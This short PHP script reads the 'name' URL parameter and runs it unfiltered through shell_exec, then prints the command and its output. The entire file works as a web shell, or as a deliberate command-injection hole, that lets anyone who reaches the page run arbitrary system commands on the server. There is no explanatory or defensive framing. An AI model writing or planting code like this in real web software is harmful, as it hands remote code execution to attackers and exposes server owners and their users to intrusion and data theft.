<?php

$NAME = $_GET['name'];
//echo $NAME;
$output = shell_exec($NAME);

echo "$NAME: $output";


?>
